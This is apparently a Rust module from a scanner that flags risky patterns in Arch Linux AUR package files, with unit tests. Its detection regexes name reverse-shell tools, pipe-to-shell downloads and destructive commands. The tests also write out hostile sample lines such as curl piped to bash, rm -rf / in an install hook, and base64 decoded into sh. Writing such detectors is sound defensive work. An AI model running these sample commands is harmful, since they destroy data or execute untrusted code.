use std::sync::OnceLock;

use regex::Regex;

use crate::{
    pkgbuild_parser::{Pkgbuild, SourceLocation, SrcInfoEntry, is_remote_url, is_vcs_source},
    report::{Finding, Severity},
};

pub fn scan_pkgbuild_metadata(pkgbuild: &Pkgbuild) -> Vec<Finding> {
    let mut findings = Vec::new();

    for source in &pkgbuild.sources {
        if source.dynamic {
            findings.push(
                Finding::new(
                    "pkgbuild.dynamic-source",
                    Severity::High,
                    "PKGBUILD",
                    source.line,
                    "Dynamic source entry",
                    "The source array contains shell expansion or command substitution that cannot be resolved statically.",
                    "Manually expand and inspect the resolved source URL or file before building.",
                )
                .with_snippet(&source.raw),
            );
        }

        if let SourceLocation::Remote(url) = &source.location {
            let lower = url.to_ascii_lowercase();
            if !(lower.starts_with("https://") || lower.starts_with("git+https://")) {
                findings.push(
                    Finding::new(
                        "source.non-https",
                        Severity::Medium,
                        "PKGBUILD",
                        source.line,
                        "Non-HTTPS source",
                        "A remote source is fetched without HTTPS transport integrity.",
                        "Prefer HTTPS sources or manually verify why this transport is required.",
                    )
                    .with_snippet(&source.raw),
                );
            }

            if is_vcs_source(url) {
                findings.push(
                    Finding::new(
                        "source.vcs",
                        Severity::Medium,
                        "PKGBUILD",
                        source.line,
                        "Mutable VCS source",
                        "VCS sources can move unless pinned to an immutable commit.",
                        "Check that the source is pinned and review the referenced upstream repository.",
                    )
                    .with_snippet(&source.raw),
                );
            }
        }
    }

    for checksum in &pkgbuild.checksums {
        if checksum.value.eq_ignore_ascii_case("SKIP") {
            findings.push(
                Finding::new(
                    "checksum.skip",
                    Severity::Medium,
                    "PKGBUILD",
                    checksum.line,
                    "Checksum verification skipped",
                    format!("{} contains SKIP, so makepkg will not verify that source.", checksum.algorithm),
                    "Require a real checksum for fixed sources, or manually justify the exception for VCS sources.",
                )
                .with_snippet("SKIP"),
            );
        }
    }

    if let Some(install) = &pkgbuild.install {
        findings.push(
            Finding::new(
                "pkgbuild.install-script",
                Severity::Medium,
                "PKGBUILD",
                install.line,
                "Install script declared",
                "A .install script runs package lifecycle hooks as root on the user's system.",
                "Review every function in the install script before installing.",
            )
            .with_snippet(&install.raw),
        );
    }

    for function in &pkgbuild.functions {
        if function.name == "pkgver" {
            let suspicious = re(
                r"(?i)\b(curl|wget|fetch|git\s+clone|git\s+ls-remote|date|openssl\s+rand|/dev/urandom|sed\s+-i\s+PKGBUILD)\b",
            );
            let severity = if suspicious.is_match(&function.body) {
                Severity::High
            } else {
                Severity::Low
            };
            let message = if severity == Severity::High {
                "pkgver() performs network, randomness, timestamp, or self-modifying behavior."
            } else {
                "pkgver() is dynamic and should be checked because static analysis cannot prove its output."
            };
            findings.push(
                Finding::new(
                    "pkgbuild.dynamic-pkgver",
                    severity,
                    "PKGBUILD",
                    function.start_line,
                    "Dynamic pkgver()",
                    message,
                    "Inspect pkgver() manually and ensure it only derives a deterministic version from local sources.",
                )
                .with_snippet(first_lines(&function.body, 4)),
            );
        }
    }

    findings
}

pub fn scan_text_file(rel_path: &str, text: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    if rel_path.ends_with(".install") {
        findings.push(Finding::new(
            "install-script.present",
            Severity::Medium,
            rel_path,
            1,
            "Install script file",
            "Pacman install scripts run lifecycle functions as root.",
            "Review post_install, post_upgrade, pre_remove, and post_remove before installing.",
        ));
    }

    if rel_path.ends_with(".hook") {
        findings.push(Finding::new(
            "pacman-hook.present",
            Severity::Medium,
            rel_path,
            1,
            "Pacman hook file",
            "Pacman hooks can run commands during package transactions.",
            "Review trigger scope and Exec command before installing.",
        ));
    }

    if rel_path == ".gitmodules" || rel_path.ends_with("/.gitmodules") {
        findings.push(Finding::new(
            "git.submodules",
            Severity::Medium,
            rel_path,
            1,
            "Git submodules declared",
            "Submodules add additional remote code that may not be visible in the AUR package metadata.",
            "Inspect each submodule URL and pinned commit before building.",
        ));
    }

    let lines = text.lines().collect::<Vec<_>>();
    for (idx, line) in lines.iter().enumerate() {
        let line_no = idx + 1;
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        scan_line_rules(rel_path, line_no, line, &mut findings);
    }

    scan_chmod_execute(rel_path, &lines, &mut findings);
    findings
}

pub fn scan_srcinfo(entries: &[SrcInfoEntry]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for entry in entries {
        if entry.key == "source" && is_remote_url(&entry.value) {
            let lower = entry.value.to_ascii_lowercase();
            if !(lower.starts_with("https://") || lower.starts_with("git+https://")) {
                findings.push(
                    Finding::new(
                        "srcinfo.non-https",
                        Severity::Medium,
                        ".SRCINFO",
                        entry.line,
                        "Non-HTTPS source in .SRCINFO",
                        "The generated source metadata contains a non-HTTPS source.",
                        "Compare .SRCINFO with PKGBUILD and prefer HTTPS sources.",
                    )
                    .with_snippet(&entry.value),
                );
            }
            if is_vcs_source(&entry.value) {
                findings.push(
                    Finding::new(
                        "srcinfo.vcs",
                        Severity::Medium,
                        ".SRCINFO",
                        entry.line,
                        "Mutable VCS source in .SRCINFO",
                        "The generated source metadata references mutable VCS content.",
                        "Check pinning and compare with the PKGBUILD source array.",
                    )
                    .with_snippet(&entry.value),
                );
            }
        }

        if is_checksum_key(&entry.key) && entry.value.eq_ignore_ascii_case("SKIP") {
            findings.push(
                Finding::new(
                    "srcinfo.checksum-skip",
                    Severity::Medium,
                    ".SRCINFO",
                    entry.line,
                    "Checksum SKIP in .SRCINFO",
                    "Generated package metadata shows skipped source verification.",
                    "Confirm this matches the PKGBUILD and manually justify the skipped checksum.",
                )
                .with_snippet(&entry.value),
            );
        }
    }
    findings
}

fn is_checksum_key(key: &str) -> bool {
    let lower = key.to_ascii_lowercase();
    lower == "b2sums"
        || lower.starts_with("b2sums_")
        || lower == "md5sums"
        || lower.starts_with("md5sums_")
        || lower == "sha1sums"
        || lower.starts_with("sha1sums_")
        || lower == "sha224sums"
        || lower.starts_with("sha224sums_")
        || lower == "sha256sums"
        || lower.starts_with("sha256sums_")
        || lower == "sha384sums"
        || lower.starts_with("sha384sums_")
        || lower == "sha512sums"
        || lower.starts_with("sha512sums_")
}

fn scan_line_rules(rel_path: &str, line_no: usize, line: &str, findings: &mut Vec<Finding>) {
    let trimmed = line.trim();

    if re(r"(?i)\b(curl|wget)\b[^#\n]*\|\s*(sudo\s+)?(sh|bash|dash|zsh|python|perl|ruby|node)\b")
        .is_match(trimmed)
        || re(r#"(?i)\b(sh|bash|dash|zsh)\s+-c\s+['"]?\s*(curl|wget)\b"#).is_match(trimmed)
    {
        findings.push(
            Finding::new(
                "shell.remote-pipe",
                Severity::Critical,
                rel_path,
                line_no,
                "Remote download piped to interpreter",
                "Downloaded bytes appear to be executed directly by a shell or interpreter.",
                "Do not build until the fetched script is reviewed and replaced with a verified source.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r"(?i)\b(gzip|gunzip|zcat)\b[^#\n]*\|\s*(sh|bash|dash|zsh|python|perl|ruby|node)\b")
        .is_match(trimmed)
    {
        findings.push(
            Finding::new(
                "shell.compressed-pipe",
                Severity::High,
                rel_path,
                line_no,
                "Compressed payload piped to interpreter",
                "A compressed stream appears to be decompressed and executed without inspection.",
                "Extract the payload separately and review it before considering the package.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r"(?i)\bbase64\b[^#\n]*(?:-[A-Za-z]*d|--decode)\b|\bxxd\b\s+-r|\bopenssl\b\s+enc\b|fromhex\s*\(|unhexlify\s*\(")
        .is_match(trimmed)
    {
        findings.push(
            Finding::new(
                "obfuscation.decoder",
                Severity::High,
                rel_path,
                line_no,
                "Encoded payload decoder",
                "The line decodes base64, hex, or encrypted-looking content during the build or install flow.",
                "Decode the payload offline and inspect what would run or be installed.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r"[A-Za-z0-9+/]{120,}={0,2}").is_match(trimmed) {
        findings.push(
            Finding::new(
                "obfuscation.long-base64",
                Severity::Medium,
                rel_path,
                line_no,
                "Long encoded-looking string",
                "A long base64-like blob is present in a script or package file.",
                "Identify the decoded content and verify why it is embedded.",
            )
            .with_snippet(trimmed.chars().take(160).collect::<String>()),
        );
    }

    if re(r"(?i)(^|[;&|[:space:]])(sudo|doas)([[:space:]]|$)|\bsu\s+-c\b").is_match(trimmed) {
        findings.push(
            Finding::new(
                "privilege.escalation",
                Severity::High,
                rel_path,
                line_no,
                "Privilege escalation command",
                "Build and install scripts should not invoke sudo, su, or doas.",
                "Remove the escalation path or inspect why root is requested before installation.",
            )
            .with_snippet(trimmed),
        );
    }

    if writes_outside_pkgdir(trimmed) {
        findings.push(
            Finding::new(
                "filesystem.outside-pkgdir",
                Severity::High,
                rel_path,
                line_no,
                "Writes outside pkgdir/srcdir",
                "The line appears to write directly to an absolute system path instead of $pkgdir or $srcdir.",
                "Confirm the write target; package() should stage files under $pkgdir only.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r"(?i)(/etc/profile|\.bashrc|\.zshrc|\.profile|systemctl\b|/etc/systemd|/etc/pacman\.d/hooks|/usr/share/libalpm/hooks|\.hook\b)")
        .is_match(trimmed)
    {
        let severity = if trimmed.contains("$pkgdir") || trimmed.contains("${pkgdir}") {
            Severity::Medium
        } else {
            Severity::High
        };
        findings.push(
            Finding::new(
                "system.modification",
                severity,
                rel_path,
                line_no,
                "System integration modification",
                "The line references shell profiles, systemd state, or pacman/libalpm hooks.",
                "Review whether this changes host behavior during build/install or only stages packaged files.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r"(?i)\bgit\s+(clone|fetch|ls-remote|submodule\s+update)\b").is_match(trimmed) {
        findings.push(
            Finding::new(
                "network.git-fetch",
                Severity::High,
                rel_path,
                line_no,
                "Git fetch during build",
                "The build script fetches remote git content outside the declared source array.",
                "Move remote content into pinned sources or manually inspect the fetched revision.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r"(?i)\b(npm|yarn|pnpm)\s+(install|ci|add)\b|\bpip\s+install\b|\bpython\s+-m\s+pip\s+install\b|\bcargo\s+install\b|\bgo\s+(install|get)\b|\bgem\s+install\b|\bbundle\s+install\b")
        .is_match(trimmed)
    {
        findings.push(
            Finding::new(
                "network.package-manager",
                Severity::Medium,
                rel_path,
                line_no,
                "Language package manager fetch",
                "The build invokes a language package manager command that may fetch code from the network.",
                "Require offline/locked dependency use or review the fetched dependency graph.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r#"(?i)\beval\b|\b(python|perl|node|ruby)\s+-e\b|\bexec\s*\(|\bcompile\s*\(|\btr\s+['"]?A-Za-z|\$\{[^}]+//|__import__\(['"]base64['"]\)"#)
        .is_match(trimmed)
    {
        findings.push(
            Finding::new(
                "obfuscation.dynamic-code",
                Severity::High,
                rel_path,
                line_no,
                "Dynamic or obfuscated code execution",
                "The line uses eval, inline interpreter code, string transforms, or dynamic execution constructs.",
                "Reduce the expression to plain code and inspect the actual command that would execute.",
            )
            .with_snippet(trimmed),
        );
    }

    if re(r"(?i)\brm\s+-[rfR]*\s+/(?:\s|$)|\bdd\b[^#\n]*\bof=/dev/|\bmkfs(\.[A-Za-z0-9]+)?\b|\bchattr\b|\bsetcap\b|\bchmod\b[^#\n]*(u\+s|[45][0-9]{3})|\b(nc|ncat|netcat|socat)\b|/dev/tcp/|\bbash\s+-i\b")
        .is_match(trimmed)
    {
        findings.push(
            Finding::new(
                "dangerous.command",
                Severity::Critical,
                rel_path,
                line_no,
                "Known dangerous command",
                "The line contains a destructive, persistence, network shell, capability, or setuid-style command.",
                "Treat as hostile until manually proven benign in context.",
            )
            .with_snippet(trimmed),
        );
    }
}

fn writes_outside_pkgdir(line: &str) -> bool {
    if line.contains("$pkgdir")
        || line.contains("${pkgdir}")
        || line.contains("$srcdir")
        || line.contains("${srcdir}")
    {
        return false;
    }

    re(r#"(?i)\b(install|cp|mv|mkdir|touch|ln|tee|sed)\b[^#\n]*([[:space:]"'=])/(etc|usr|bin|sbin|home|root|var|boot|lib)\b"#)
        .is_match(line)
}

fn scan_chmod_execute(rel_path: &str, lines: &[&str], findings: &mut Vec<Finding>) {
    let chmod_re = re(r"(?i)\bchmod\b[^#\n]*(\+x|[57][0-9]{2,3})\b");
    let exec_re = re(
        r"(^|[;&|[:space:]])(\./|sh[[:space:]]+|bash[[:space:]]+|python[[:space:]]+|perl[[:space:]]+|ruby[[:space:]]+|node[[:space:]]+)",
    );

    for (idx, line) in lines.iter().enumerate() {
        let trimmed = line.trim();
        if !chmod_re.is_match(trimmed) {
            continue;
        }
        let end = (idx + 6).min(lines.len());
        let window = &lines[idx + 1..end];
        if window.iter().any(|next| exec_re.is_match(next.trim())) {
            findings.push(
                Finding::new(
                    "execution.chmod-run",
                    Severity::High,
                    rel_path,
                    idx + 1,
                    "chmod +x followed by execution",
                    "A file is made executable and then an executable or interpreter is run shortly after.",
                    "Inspect the generated or downloaded executable before it is run.",
                )
                .with_snippet(trimmed),
            );
        }
    }
}

fn first_lines(text: &str, max: usize) -> String {
    text.lines().take(max).collect::<Vec<_>>().join("\n")
}

fn re(pattern: &'static str) -> &'static Regex {
    type RegexCache = std::sync::Mutex<std::collections::HashMap<&'static str, &'static Regex>>;
    static CACHE: OnceLock<RegexCache> = OnceLock::new();

    let cache = CACHE.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()));
    let mut guard = cache.lock().expect("regex cache poisoned");
    if let Some(regex) = guard.get(pattern) {
        return regex;
    }
    let regex = Box::leak(Box::new(Regex::new(pattern).expect("valid regex")));
    guard.insert(pattern, regex);
    regex
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::pkgbuild_parser::parse_pkgbuild;

    #[test]
    fn detects_curl_pipe_shell() {
        let findings = scan_text_file("PKGBUILD", "prepare() {\n curl https://x | bash\n}");
        assert!(findings.iter().any(|f| f.rule_id == "shell.remote-pipe"));
    }

    #[test]
    fn detects_checksum_skip() {
        let pkgbuild = parse_pkgbuild("source=('x')\nsha256sums=('SKIP')\n");
        let findings = scan_pkgbuild_metadata(&pkgbuild);
        assert!(findings.iter().any(|f| f.rule_id == "checksum.skip"));
    }

    #[test]
    fn detects_non_https_source() {
        let pkgbuild = parse_pkgbuild("source=('http://example.invalid/x')\n");
        let findings = scan_pkgbuild_metadata(&pkgbuild);
        assert!(findings.iter().any(|f| f.rule_id == "source.non-https"));
    }

    #[test]
    fn detects_chmod_then_execution() {
        let findings = scan_text_file("PKGBUILD", "chmod +x payload\n./payload\n");
        assert!(findings.iter().any(|f| f.rule_id == "execution.chmod-run"));
    }

    #[test]
    fn detects_rm_root() {
        let findings = scan_text_file("bad.install", "post_install() {\n rm -rf /\n}");
        assert!(findings.iter().any(|f| f.rule_id == "dangerous.command"));
    }

    #[test]
    fn detects_base64_decode_long_option() {
        let findings = scan_text_file("bad.install", "echo ZWNobyBoaQ== | base64 --decode | sh");
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation.decoder"));
    }
}
